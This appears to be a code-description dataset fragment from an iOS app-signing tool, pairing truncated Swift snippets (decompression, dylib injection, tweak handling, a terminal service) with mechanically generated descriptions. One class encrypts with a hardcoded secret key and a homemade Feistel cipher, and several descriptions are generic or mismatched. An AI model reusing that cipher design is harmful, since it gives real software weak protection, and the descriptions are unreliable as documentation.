    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/decompression/Decompression.swift",
    "code_type": "function"
  },
  {
    "id": "199",
    "code": "func handleCompressedFile(extension _: String, decompressor: (Data) throws -> Data) throws {\nlet compressedData = try readData(from: packagesFile)\nlet decompressedData = try decompressor(compressedData)\nlet outputURL = packagesFile.deletingPathExtension()\ntry writeData(decompressedData, to: outputURL)\npackagesFile = outputURL\n}\n\nfunc handleTarFile() throws {",
    "nl": "extension _ - implements _ functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/decompression/Decompression.swift",
    "code_type": "extension"
  },
  {
    "id": "200",
    "code": "func handleTarFile() throws {\nlet tarData = try readData(from: packagesFile)\nlet tarContainer = try TarContainer.open(container: tarData)\n\nlet extractionDirectory = packagesFile.deletingLastPathComponent().appendingPathComponent(UUID().uuidString)\ntry fileManager.createDirectory(at: extractionDirectory, withIntermediateDirectories: true, attributes: nil)\n\nfor entry in tarContainer {",
    "nl": "Function handleTarFile - implements handletarfile functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/FileHandling/decompression/Decompression.swift",
    "code_type": "function"
  },
  {
    "id": "201",
    "code": "class BackdoorEncryption {\n// Hardcoded secret key for encryption and decryption\nprivate static let SECRET = \"bdg_was_here_2025_backdoor_245\".data(using: .utf8)!\n\n// Derive key using SHA256\nprivate static var KEY: Data {",
    "nl": "/ Provides custom encryption and decryption capabilities for .backdoor files / This implementation matches the Python reference implementation for compatibility",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/BackdoorEncryption.swift",
    "code_type": "class"
  },
  {
    "id": "202",
    "code": "static func pad(_ data: Data, blockSize: Int = 16) -> Data {\nif data.count % blockSize == 0 {",
    "nl": "/ Pads data to align with block size / - Parameters: /   - data: The data to pad /   - blockSize: Block size (default: 16 bytes) / - Returns: Padded data",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/BackdoorEncryption.swift",
    "code_type": "function"
  },
  {
    "id": "203",
    "code": "static func permute(_ block: Data) -> Data {\nreturn Data(block.reversed())\n}\n\n/// Transformation function for Feistel network\n/// - Parameters:\n///   - data: Input data\n///   - roundKey: Round key\n/// - Returns: Transformed data\nstatic func F(_ data: Data, roundKey: Data) -> Data {",
    "nl": "/ Custom permutation for obfuscation (byte reversal) / - Parameter block: Block to permute / - Returns: Permuted block",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/BackdoorEncryption.swift",
    "code_type": "function"
  },
  {
    "id": "204",
    "code": "static func F(_ data: Data, roundKey: Data) -> Data {\nvar combined = data\ncombined.append(roundKey)\n\nlet hash = SHA256.hash(data: combined)\nreturn hash.withUnsafeBytes { bytes in",
    "nl": "/ Transformation function for Feistel network / - Parameters: /   - data: Input data /   - roundKey: Round key / - Returns: Transformed data",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/BackdoorEncryption.swift",
    "code_type": "function"
  },
  {
    "id": "205",
    "code": "static func encryptBlock(_ block: Data, key: Data) -> Data {\nvar L = block.prefix(8)\nvar R = block.suffix(8)\n\nfor round in 0 ..< 4 {",
    "nl": "/ Encrypts a single 16-byte block using a Feistel network / - Parameters: /   - block: 16-byte block to encrypt /   - key: Encryption key / - Returns: Encrypted block",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/BackdoorEncryption.swift",
    "code_type": "function"
  },
  {
    "id": "206",
    "code": "static func decryptBlock(_ block: Data, key: Data) -> Data {\nvar R = block.prefix(8)\nvar L = block.suffix(8)\n\nfor round in (0 ..< 4).reversed() {",
    "nl": "/ Decrypts a single 16-byte block using a Feistel network / - Parameters: /   - block: 16-byte block to decrypt /   - key: Decryption key / - Returns: Decrypted block",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/BackdoorEncryption.swift",
    "code_type": "function"
  },
  {
    "id": "207",
    "code": "static func encryptData(_ data: Data, key: Data? = nil) -> Data {\nlet encryptionKey = key ?? KEY\nlet paddedData = pad(data)\n\n// Split into 16-byte blocks\nvar encryptedData = Data()\n\nfor i in stride(from: 0, to: paddedData.count, by: 16) {",
    "nl": "/ Encrypts data using custom block cipher / - Parameters: /   - data: Data to encrypt /   - key: Optional custom key (uses default if nil) / - Returns: Encrypted data",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/BackdoorEncryption.swift",
    "code_type": "function"
  },
  {
    "id": "208",
    "code": "static func decryptData(_ encryptedData: Data, key: Data? = nil, originalLength: Int) -> Data {\nlet decryptionKey = key ?? KEY\nvar decryptedData = Data()\n\n// Process each 16-byte block\nfor i in stride(from: 0, to: encryptedData.count, by: 16) {",
    "nl": "/ Decrypts data using custom block cipher / - Parameters: /   - encryptedData: Data to decrypt /   - key: Optional custom key (uses default if nil) /   - originalLength: Length of the original data before padding / - Returns: Decrypted data",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Security/BackdoorEncryption.swift",
    "code_type": "function"
  },
  {
    "id": "209",
    "code": "func zsign(_ appPath: String,\n_ provisionPath: String,\n_ p12Path: String,\n_ password: String,\n_ bundleId: String,\n_ name: String,\n_ version: String,\n_ removeProvisioningFile: Bool) -> Int32\n\n// MARK: - External C++ functions\n\n@_silgen_name(\"InjectDyLib\")\nprivate func _InjectDyLib(_ filePath: String, _ dylibPath: String, _ weakInject: Bool, _ bCreate: Bool) -> Bool\n\n@_silgen_name(\"ChangeDylibPath\")\nprivate func _ChangeDylibPath(_ filePath: String, _ oldPath: String, _ newPath: String) -> Bool\n\n@_silgen_name(\"ListDylibs\")\nprivate func _ListDylibs(_ filePath: String, _ dylibPaths: NSMutableArray) -> Bool\n\n@_silgen_name(\"UninstallDylibs\")\nprivate func _UninstallDylibs(_ filePath: String, _ dylibPaths: [String]) -> Bool\n\n// MARK: - Swift wrapper functions\n\nfunc injectDyLib(_ filePath: String, _ dylibPath: String, _ weakInject: Bool, _ bCreate: Bool) -> Bool {",
    "nl": "Function zsign - implements zsign functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift",
    "code_type": "function"
  },
  {
    "id": "210",
    "code": "private func _InjectDyLib(_ filePath: String, _ dylibPath: String, _ weakInject: Bool, _ bCreate: Bool) -> Bool\n\n@_silgen_name(\"ChangeDylibPath\")\nprivate func _ChangeDylibPath(_ filePath: String, _ oldPath: String, _ newPath: String) -> Bool\n\n@_silgen_name(\"ListDylibs\")\nprivate func _ListDylibs(_ filePath: String, _ dylibPaths: NSMutableArray) -> Bool\n\n@_silgen_name(\"UninstallDylibs\")\nprivate func _UninstallDylibs(_ filePath: String, _ dylibPaths: [String]) -> Bool\n\n// MARK: - Swift wrapper functions\n\nfunc injectDyLib(_ filePath: String, _ dylibPath: String, _ weakInject: Bool, _ bCreate: Bool) -> Bool {",
    "nl": "Function _InjectDyLib - implements  injectdylib functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift",
    "code_type": "function"
  },
  {
    "id": "211",
    "code": "private func _ChangeDylibPath(_ filePath: String, _ oldPath: String, _ newPath: String) -> Bool\n\n@_silgen_name(\"ListDylibs\")\nprivate func _ListDylibs(_ filePath: String, _ dylibPaths: NSMutableArray) -> Bool\n\n@_silgen_name(\"UninstallDylibs\")\nprivate func _UninstallDylibs(_ filePath: String, _ dylibPaths: [String]) -> Bool\n\n// MARK: - Swift wrapper functions\n\nfunc injectDyLib(_ filePath: String, _ dylibPath: String, _ weakInject: Bool, _ bCreate: Bool) -> Bool {",
    "nl": "Function _ChangeDylibPath - implements  changedylibpath functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift",
    "code_type": "function"
  },
  {
    "id": "212",
    "code": "private func _ListDylibs(_ filePath: String, _ dylibPaths: NSMutableArray) -> Bool\n\n@_silgen_name(\"UninstallDylibs\")\nprivate func _UninstallDylibs(_ filePath: String, _ dylibPaths: [String]) -> Bool\n\n// MARK: - Swift wrapper functions\n\nfunc injectDyLib(_ filePath: String, _ dylibPath: String, _ weakInject: Bool, _ bCreate: Bool) -> Bool {",
    "nl": "Function _ListDylibs - implements  listdylibs functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift",
    "code_type": "function"
  },
  {
    "id": "213",
    "code": "private func _UninstallDylibs(_ filePath: String, _ dylibPaths: [String]) -> Bool\n\n// MARK: - Swift wrapper functions\n\nfunc injectDyLib(_ filePath: String, _ dylibPath: String, _ weakInject: Bool, _ bCreate: Bool) -> Bool {",
    "nl": "Function _UninstallDylibs - implements  uninstalldylibs functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift",
    "code_type": "function"
  },
  {
    "id": "214",
    "code": "func injectDyLib(_ filePath: String, _ dylibPath: String, _ weakInject: Bool, _ bCreate: Bool) -> Bool {\nreturn _InjectDyLib(filePath, dylibPath, weakInject, bCreate)\n}\n\nfunc changeDylibPath(_ filePath: String, _ oldPath: String, _ newPath: String) -> Bool {",
    "nl": "MARK: - Swift wrapper functions",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift",
    "code_type": "function"
  },
  {
    "id": "215",
    "code": "func changeDylibPath(_ filePath: String, _ oldPath: String, _ newPath: String) -> Bool {\nreturn _ChangeDylibPath(filePath, oldPath, newPath)\n}\n\nfunc getDylibsList(_ filePath: String, _ dylibPaths: NSMutableArray) -> Bool {",
    "nl": "Function changeDylibPath - implements changedylibpath functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift",
    "code_type": "function"
  },
  {
    "id": "216",
    "code": "func getDylibsList(_ filePath: String, _ dylibPaths: NSMutableArray) -> Bool {\nreturn _ListDylibs(filePath, dylibPaths)\n}\n\nfunc removeDylibs(_ filePath: String, _ dylibPaths: [String]) -> Bool {",
    "nl": "Function getDylibsList - retrieves dylibslist",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift",
    "code_type": "function"
  },
  {
    "id": "217",
    "code": "func removeDylibs(_ filePath: String, _ dylibPaths: [String]) -> Bool {\nreturn _UninstallDylibs(filePath, dylibPaths)\n}\n\n// MARK: - App Signing Functions\n\nfunc signInitialApp(\nbundle: BundleOptions,\nmainOptions: SigningMainDataWrapper,\nsigningOptions: SigningDataWrapper,",
    "nl": "Function removeDylibs - implements removedylibs functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift",
    "code_type": "function"
  },
  {
    "id": "218",
    "code": "func signInitialApp(\nbundle: BundleOptions,\nmainOptions: SigningMainDataWrapper,\nsigningOptions: SigningDataWrapper,\nappPath: URL,\ncompletion: @escaping (Result<(URL, NSManagedObject), Error>) -> Void\n) {",
    "nl": "MARK: - App Signing Functions",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift",
    "code_type": "function"
  },
  {
    "id": "219",
    "code": "func resignApp(certificate: Certificate, appPath: URL, completion: @escaping (Bool) -> Void) {\nUIApplication.shared.isIdleTimerDisabled = true\n\nDispatchQueue(label: \"Resigning\").async {",
    "nl": "Function resignApp - implements resignapp functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift",
    "code_type": "function"
  },
  {
    "id": "220",
    "code": "private func signAppWithZSign(\ntmpDirApp: URL,\ncertPaths: (provisionPath: String, p12Path: String),\npassword: String,\nmain: SigningMainDataWrapper? = nil,\noptions: SigningDataWrapper? = nil\n) throws {",
    "nl": "MARK: - Helper Functions",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift",
    "code_type": "function"
  },
  {
    "id": "221",
    "code": "func injectDylib(filePath: String, dylibPath: String, weakInject: Bool) -> Bool {\n// Call injectDyLib function using the Swift wrapper\nlet bCreate = false\nreturn injectDyLib(filePath, dylibPath, weakInject, bCreate)\n}\n\nfunc changeDylib(filePath: String, oldPath: String, newPath: String) -> Bool {",
    "nl": "Function injectDylib - implements injectdylib functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift",
    "code_type": "function"
  },
  {
    "id": "222",
    "code": "func changeDylib(filePath: String, oldPath: String, newPath: String) -> Bool {\n// Call changeDylibPath function using the Swift wrapper\nreturn changeDylibPath(filePath, oldPath, newPath)\n}\n\nfunc updateMobileProvision(app: URL) throws {",
    "nl": "Function changeDylib - implements changedylib functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift",
    "code_type": "function"
  },
  {
    "id": "223",
    "code": "func updateMobileProvision(app: URL) throws {\nlet provisioningFilePath = app.appendingPathComponent(\"embedded.mobileprovision\")\nif FileManager.default.fileExists(atPath: provisioningFilePath.path) {",
    "nl": "Function updateMobileProvision - updates mobileprovision",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift",
    "code_type": "function"
  },
  {
    "id": "224",
    "code": "func listDylibs(filePath: String) -> [String]? {\n// Call listDylibs function using the Swift wrapper\nlet dylibPathsArray = NSMutableArray()\n\nlet success = getDylibsList(filePath, dylibPathsArray)\n\nif success {",
    "nl": "Function listDylibs - implements listdylibs functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift",
    "code_type": "function"
  },
  {
    "id": "225",
    "code": "func uninstallDylibs(filePath: String, dylibPaths: [String]) -> Bool {\n// Call removeDylibs function using the Swift wrapper\nreturn removeDylibs(filePath, dylibPaths)\n}\n\nfunc updatePlugIns(options: SigningDataWrapper, app: URL) throws {",
    "nl": "Function uninstallDylibs - implements uninstalldylibs functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift",
    "code_type": "function"
  },
  {
    "id": "226",
    "code": "func updatePlugIns(options: SigningDataWrapper, app: URL) throws {\nif options.signingOptions.removePlugins {",
    "nl": "Function updatePlugIns - updates plugins",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift",
    "code_type": "function"
  },
  {
    "id": "227",
    "code": "func removeWatchPlaceholderExtension(options: SigningDataWrapper, app: URL) throws {\nif options.signingOptions.removeWatchPlaceHolder {",
    "nl": "Function removeWatchPlaceholderExtension - implements removewatchplaceholderextension functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift",
    "code_type": "function"
  },
  {
    "id": "228",
    "code": "func updateInfoPlist(\ninfoDict: NSMutableDictionary,\nmain: SigningMainDataWrapper,\noptions: SigningDataWrapper,\nicon _: UIImage?,\napp: URL\n) throws {",
    "nl": "Function updateInfoPlist - updates infoplist",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift",
    "code_type": "function"
  },
  {
    "id": "229",
    "code": "func updateLocalizedInfoPlist(in appDirectory: URL, newDisplayName: String) {\nlet fileManager = FileManager.default\ndo {",
    "nl": "Function updateLocalizedInfoPlist - updates localizedinfoplist",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/AppSigner.swift",
    "code_type": "function"
  },
  {
    "id": "230",
    "code": "class TweakHandler {\nlet fileManager = FileManager.default\n\nprivate var urls: [String]\nprivate let app: URL\nprivate var urlsToInject: [URL] = []\nprivate var directoriesToCheck: [URL] = []\n\ninit(urls: [String], app: URL) {",
    "nl": "class TweakHandler - implements functionality related to tweak handler",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift",
    "code_type": "class"
  },
  {
    "id": "231",
    "code": "func getInputFiles() throws {\nguard !urls.isEmpty else {",
    "nl": "Function getInputFiles - retrieves inputfiles",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift",
    "code_type": "function"
  },
  {
    "id": "232",
    "code": "private func handleExtractedDirectoryContents(at urls: [URL]) throws {\nfor url in urls {",
    "nl": "finally, handle extracted contents",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift",
    "code_type": "function"
  },
  {
    "id": "233",
    "code": "private func handleDylib(at url: URL) throws {\ndo {",
    "nl": "Inject imported dylib file",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift",
    "code_type": "function"
  },
  {
    "id": "234",
    "code": "private func handleDylib(framework: URL) throws {\ndo {",
    "nl": "Inject imported framework dir",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift",
    "code_type": "function"
  },
  {
    "id": "235",
    "code": "private func handleDeb(at url: URL, baseTmpDir: URL) throws {\nlet uniqueSubDir = baseTmpDir.appendingPathComponent(UUID().uuidString)\ntry Self.createDirectoryIfNeeded(at: uniqueSubDir)\n\n// I don't particularly like this code\n// but it somehow works well enough,\n// do note large lzma's are slow as hell\ndo {",
    "nl": "Extract imported deb file",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift",
    "code_type": "function"
  },
  {
    "id": "236",
    "code": "private func handleDirectories(at urls: [URL]) throws {\nlet directoriesToCheck = [\n\"Library/Frameworks/\",\n\"var/jb/Library/Frameworks/\",\n\"Library/MobileSubstrate/DynamicLibraries/\",\n\"var/jb/Library/MobileSubstrate/DynamicLibraries/\",\n\"Library/Application Support/\",\n\"var/jb/Library/Application Support/\",\n]\n",
    "nl": "Read extracted deb file, locate all necessary contents to copy over to the .app",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift",
    "code_type": "function"
  },
  {
    "id": "237",
    "code": "extension TweakHandler {\nprivate func searchForBundles(in directory: URL) throws {",
    "nl": "MARK: - Find correct files in debs",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift",
    "code_type": "extension"
  },
  {
    "id": "238",
    "code": "private func searchForBundles(in directory: URL) throws {\nlet fileManager = FileManager.default\nlet allFiles = try fileManager.contentsOfDirectory(\nat: directory,\nincludingPropertiesForKeys: nil,\noptions: [.skipsHiddenFiles]\n)\n\nlet bundleDirectories = allFiles.filter { url in",
    "nl": "Function searchForBundles - implements searchforbundles functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift",
    "code_type": "function"
  },
  {
    "id": "239",
    "code": "private func locateDylibFiles(in directory: URL) throws -> [URL] {\nlet fileManager = FileManager.default\nlet files = try fileManager.contentsOfDirectory(at: directory, includingPropertiesForKeys: nil, options: [])\n\nreturn files.filter { url in",
    "nl": "Function locateDylibFiles - implements locatedylibfiles functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift",
    "code_type": "function"
  },
  {
    "id": "240",
    "code": "private func locateFrameworkDirectories(in directory: URL) throws -> [URL] {\nlet fileManager = FileManager.default\nlet files = try fileManager.contentsOfDirectory(\nat: directory,\nincludingPropertiesForKeys: nil,\noptions: [.skipsHiddenFiles]\n)\n\nreturn files.filter { url in",
    "nl": "Function locateFrameworkDirectories - implements locateframeworkdirectories functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift",
    "code_type": "function"
  },
  {
    "id": "241",
    "code": "extension TweakHandler {\nprivate static func createDirectoryIfNeeded(at url: URL) throws {",
    "nl": "MARK: - File management",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift",
    "code_type": "extension"
  },
  {
    "id": "242",
    "code": "private static func createDirectoryIfNeeded(at url: URL) throws {\nlet fileManager = FileManager.default\nif !fileManager.fileExists(atPath: url.path) {",
    "nl": "Function createDirectoryIfNeeded - creates directoryifneeded",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift",
    "code_type": "function"
  },
  {
    "id": "243",
    "code": "public static func findExecutable(at frameworkURL: URL) throws -> URL? {\nlet infoPlistURL = frameworkURL.appendingPathComponent(\"Info.plist\")\n\nlet plistData = try Data(contentsOf: infoPlistURL)\nif let plist = try PropertyListSerialization\n.propertyList(from: plistData, options: [], format: nil) as? [String: Any],\nlet executableName = plist[\"CFBundleExecutable\"] as? String\n{",
    "nl": "Function findExecutable - implements findexecutable functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift",
    "code_type": "function"
  },
  {
    "id": "244",
    "code": "private static func moveFile(from sourceURL: URL, to destinationURL: URL) throws {\nlet fileManager = FileManager.default\nif fileManager.fileExists(atPath: destinationURL.path) {",
    "nl": "Function moveFile - implements movefile functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/TweakHandler.swift",
    "code_type": "function"
  },
  {
    "id": "245",
    "code": "class EsignDecryptor {\nprivate let input: String\n\ninit(input: String) {",
    "nl": "class EsignDecryptor - implements functionality related to esign decryptor",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/esign/ESignRepoParser.swift",
    "code_type": "class"
  },
  {
    "id": "246",
    "code": "func extractBase64() -> Data? {\nlet pattern = #\"source\\[(.*?)\\]\"#\n\nif let regex = try? NSRegularExpression(pattern: pattern),\nlet match = regex.firstMatch(in: input, range: NSRange(input.startIndex..., in: input)),\nlet range = Range(match.range(at: 1), in: input)\n{",
    "nl": "Function extractBase64 - implements extractbase64 functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/esign/ESignRepoParser.swift",
    "code_type": "function"
  },
  {
    "id": "247",
    "code": "func decrypt(key: [UInt8], keyLength: Int) -> [String]? {\nguard let data = extractBase64() else {",
    "nl": "Function decrypt - implements decrypt functionality",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Signing/esign/ESignRepoParser.swift",
    "code_type": "function"
  },
  {
    "id": "248",
    "code": "class LocalTerminalService {\nstatic let shared = LocalTerminalService()\n\n// Process handling\nprivate var activeProcesses: [String: Process] = [:]\nprivate var outputPipes: [String: Pipe] = [:]\nprivate var inputPipes: [String: Pipe] = [:]\n\n// Output handlers\nprivate var outputHandlers: [String: (String) -> Void] = [:]",
    "nl": "/ LocalTerminalService - An on-device implementation of terminal functionality / This replaces the previous web-based terminal implementation with a fully local solution",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift",
    "code_type": "class"
  },
  {
    "id": "249",
    "code": "func createSession(completion: @escaping (Result<String, Error>) -> Void) {\nlet sessionId = UUID().uuidString\n\n// Set default working directory to Documents\nlet documentsDirectory = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask)[0]\nworkingDirectories[sessionId] = documentsDirectory\n\nlogger.log(message: \"Created new local terminal session: \\(sessionId)\", type: .info)\ncompletion(.success(sessionId))\n}",
    "nl": "MARK: - Session Management / Creates a new terminal session",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift",
    "code_type": "function"
  },
  {
    "id": "250",
    "code": "func terminateSession(_ sessionId: String, completion: @escaping (Result<Void, Error>) -> Void) {\nif let process = activeProcesses[sessionId] {",
    "nl": "/ Terminates a terminal session",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift",
    "code_type": "function"
  },
  {
    "id": "251",
    "code": "func executeCommand(\n_ command: String,\nsessionId: String,\noutputHandler: @escaping (String) -> Void,\ncompletion: @escaping (Result<Void, Error>) -> Void\n) {",
    "nl": "MARK: - Command Execution / Executes a command in the specified session",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift",
    "code_type": "function"
  },
  {
    "id": "252",
    "code": "func sendInput(_ input: String, sessionId: String, completion: @escaping (Result<Void, Error>) -> Void) {\nguard let inputPipe = inputPipes[sessionId] else {",
    "nl": "/ Sends input to a running process",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift",
    "code_type": "function"
  },
  {
    "id": "253",
    "code": "private func handleSpecialCommand(\n_ command: String,\nsessionId: String,\noutputHandler: @escaping (String) -> Void,\ncompletion: @escaping (Result<Void, Error>) -> Void\n) -> Bool {",
    "nl": "/ Handles special built-in commands",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift",
    "code_type": "function"
  },
  {
    "id": "254",
    "code": "private func updateWorkingDirectory(\n_ command: String,\nsessionId: String,\noutputHandler: @escaping (String) -> Void\n) {",
    "nl": "/ Updates the working directory after a 'cd' command",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift",
    "code_type": "function"
  },
  {
    "id": "255",
    "code": "private func executeCustomLanguageCommand(\n_ command: String,\nsessionId: String,\noutputHandler: @escaping (String) -> Void,\ncompletion: @escaping (Result<Void, Error>) -> Void\n) {",
    "nl": "MARK: - Custom Language Support / Executes a command in our custom programming language",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift",
    "code_type": "function"
  },
  {
    "id": "256",
    "code": "private func executeSwiftCode(\n_ code: String,\nsessionId: String,\noutputHandler: @escaping (String) -> Void,\ncompletion: @escaping (Result<Void, Error>) -> Void\n) {",
    "nl": "/ Executes Swift code",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift",
    "code_type": "function"
  },
  {
    "id": "257",
    "code": "private func executePythonCode(\n_ code: String,\nsessionId: String,\noutputHandler: @escaping (String) -> Void,\ncompletion: @escaping (Result<Void, Error>) -> Void\n) {",
    "nl": "/ Executes Python code",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift",
    "code_type": "function"
  },
  {
    "id": "258",
    "code": "private func executeMixedCode(\n_ code: String,\nsessionId: String,\noutputHandler: @escaping (String) -> Void,\ncompletion: @escaping (Result<Void, Error>) -> Void\n) {",
    "nl": "/ Executes mixed code that contains both Python and Swift",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift",
    "code_type": "function"
  },
  {
    "id": "259",
    "code": "private func showHelp(outputHandler: @escaping (String) -> Void) {\nlet helpText = \"\"\"\nBackdoor Terminal Help\n======================\n\nBasic Commands:\nclear, cls     Clear the terminal screen\npwd            Print working directory\ncd <path>      Change directory\nls             List files in current directory",
    "nl": "MARK: - Terminal Help / Shows help information",
    "language": "swift",
    "folder": "Shared",
    "file_path": "/workspace/build-it-test-it_Backdoor-Signer/Shared/Magic/Terminal/LocalTerminalService.swift",
    "code_type": "function"
  },
  {
